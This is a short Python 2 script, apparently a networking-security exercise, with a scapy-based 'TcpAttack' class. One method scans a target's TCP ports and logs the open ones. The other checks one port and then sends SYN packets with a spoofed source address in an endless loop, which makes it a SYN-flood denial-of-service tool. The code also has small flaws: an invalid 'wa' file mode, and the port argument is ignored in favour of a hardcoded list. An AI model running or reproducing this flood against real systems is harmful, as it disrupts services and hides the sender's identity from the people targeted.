from scapy.all import *
from socket import *
import subprocess
import sys

class TcpAttack():

	def __init__(self, spoofIP, targetIP):
		self.spoofIP = spoofIP
		self.targetIP = targetIP

	def scanTarget(self, rangeStart, rangeEnd):
		with open('openports.txt', 'wa') as OUTFILE:
			OUTFILE.write("Open Ports on " + str(self.targetIP))

			
			# scan all ports for targetIP
			for i in range(rangeStart, rangeEnd):
				
				print i
				# create socket
				s = socket(AF_INET, SOCK_STREAM)

				# set the timeout to be 0.1 seconds so we dont hang on a closed port
				timeout = s.settimeout(0.1)
				
				# if port is open, write port to file
				result = s.connect_ex((self.targetIP, i))
				if(result == 0):
					OUTFILE.write(str(i) + '\n')
				s.close()

	def attackTarget(self, port):

		ports = [53, 80, 110, 143, 993, 995]
		# check if port is open
		s = socket(AF_INET, SOCK_STREAM)
		timeout = s.settimeout(5)
		result = s.connect_ex((self.targetIP, port))
		if(result != 0):
			return 0
		while(1):
			send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(flags="S", dport=ports))
		
		
